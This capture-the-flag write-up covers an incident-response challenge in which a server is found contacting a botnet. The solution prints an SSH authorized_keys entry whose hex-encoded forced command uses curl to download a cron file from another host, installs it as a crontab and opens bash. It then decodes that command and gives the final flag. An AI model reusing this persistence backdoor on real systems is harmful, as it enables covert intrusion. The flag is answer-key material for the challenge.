# Leonidas (2 points)
Hi, TCC-CSIRT analyst,

some suspicious communication between the device `srv-test23.cypherfix.tcc`
(10.99.24.23, 2001:db8:7cc::24:23) in our constituency and the C2 botnet
`Leonidas300` has started appearing in our IDS. The user and device
administrator in one person has no idea how this is possible but refuses to
turn off the important testing device (as a VIP, he evidently can afford to
complicate the investigation). However, he is willing to provide ssh key for
a test user to examine the device.

Your task is to analyze the incident and determine what is happening on the
device, mainly what causes the occasional detection of botnet communication.

* Download the ssh key for user 'testuser'
  (sha256 checksum: `e5d56147ea7f2c38a01a09ec144e7daba49232167e272da99f6d33af8d672397`)
* The device is available at `srv-test23.cypherfix.tcc`.
* The IDS interface is available at `http://ids.cypherfix.tcc`.

See you in the next incident!

## Hints

* The filesystem has been turned to read-only.
* IDS evaluate new events each minute and show data 60 minutes to the past.

## Solution

After downloading and extracting the provided ssh key, we can use it to log in
to the device

```console
$ ssh -i testuser testuser@srv-test23.cypherfix.tcc
```

Once logged in logged in, we can freely explore what's on the server. If we
look carefully, we'll notice that `.ssh/authorized_keys` file contains some
encoded script/command.

```console
testuser@38c62c70b10e:~$ cat .ssh/authorized_keys
no-user-rc,no-X11-forwarding,command="`#! /bin/bash`;eval $(echo 6375726c202d73202d4120274c656f6e69646173212049206861766520707265706172656420627265616b6661737420616e6420617465206865617274696c792e2e2e20466f7220746f6e696768742c2077652064696e6520696e2068656c6c2121205530633564324a48624442615657784655465661545646565a44645a5747513057564d784e4531556248424d565752445932706a64475177526b7057626a41392720687474703a2f2f31302e39392e32342e32343a38302f2e63726f6e202d6f202e63726f6e3b2063726f6e746162202e63726f6e20323e202f6465762f6e756c6c3b2f62696e2f62617368 | xxd -r -ps)" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNGDvmucMzlKsOPWMBe7v9F37+1RVbw8CCpH1582MNz9FaURIV6R3jTI2pZP0fOqe1jMlOHuzjAp6Vl6rHrlxxDPuHObTCXCOIRflezC4h1+SU+crnhXK+X6aKc2M28/OxIWZRguTjYg0jVAIi2Z1iN/cd+YBuNDU3NjCDBSUshJFDDYR4y9uvstLqK28hfRRdvxm5bhyBh2NXxcDtcKpRAnVfI4pL5QL3PbaB/WzVtcEpKMTvLb99UYg+iAK60wpXvG4FmJL8WlqSqJj7Ci9Xi/51EHJpJksVTdGgwwpS6CSz7Inlxt7u5fRM/741sHuqrFxfsQOmZXUAOKmGGZjXdIwGoqVczHUQm16tBwg9gjs0ba85VSLtFmFP2rMxDjUV11NxteE1PyzCe2npOEtPl0rCJVnadaI4Ie30eEmEBclJRmcD7XC089VdjxHnyae+j1zABjeJ7pFn53GW/X+Dqehoa/WYWjQDfkbVwqU4kAchGvWi+avQAlb6J6cUIK+C4AKddNB8jO1tjEXLnK1SdAVgTYZP8SAxlPjhnIl9xif69baO1vm123On/3sfow4/zQLFKR3oRroJKhTLV1vxjQMxUcnxnG7vbZWE9yR+4y/N5F7fV+uJs9/OYI4BTVEHR6ZlpGKK+j/SGHf1rWtM1RIANtQK4YPRDQFntvLoWQ== testuser@cypherfix.tcc
```

Let's decode it and take a look at what the script actualty does

```console
testuser@38c62c70b10e:~$ echo 6375726c202d73202d4120274c656f6e69646173212049206861766520707265706172656420627265616b6661737420616e6420617465206865617274696c792e2e2e2046
6f7220746f6e696768742c2077652064696e6520696e2068656c6c2121205530633564324a48624442615657784655465661545646565a44645a5747513057564d784e4531556248424d565752445932706a64475177526b7057626a41392720687474703a2f2f31302e39392e32342e32343a38302f2e63726f6e202d6f202e63726f6e3b2063726f6e746162202e63726f6e20323e202f6465762f6e756c6c3b2f62696e2f62617368 | xxd -r -ps
curl -s -A 'Leonidas! I have prepared breakfast and ate heartily... For tonight, we dine in hell!! U0c5d2JHbDBaVWxFUFVaTVFVZDdZWGQ0WVMxNE1UbHBMVWRDY2pjdGQwRkpWbjA9' http://10.99.24.24:80/.cron -o .cron; crontab .cron 2> /dev/null;/bin/bash
```

We can decode the suspicious Base64 string...

```console
testuser@38c62c70b10e:~$ echo U0c5d2JHbDBaVWxFUFVaTVFVZDdZWGQ0WVMxNE1UbHBMVWRDY2pjdGQwRkpWbjA9 | base64 -d
SG9wbGl0ZUlEPUZMQUd7YXd4YS14MTlpLUdCcjctd0FJVn0=
```

...only to realize that it needs to be decoded once again to yield the flag

```console
testuser@38c62c70b10e:~$ echo SG9wbGl0ZUlEPUZMQUd7YXd4YS14MTlpLUdCcjctd0FJVn0= | base64 -d
HopliteID=FLAG{awxa-x19i-GBr7-wAIV}
```
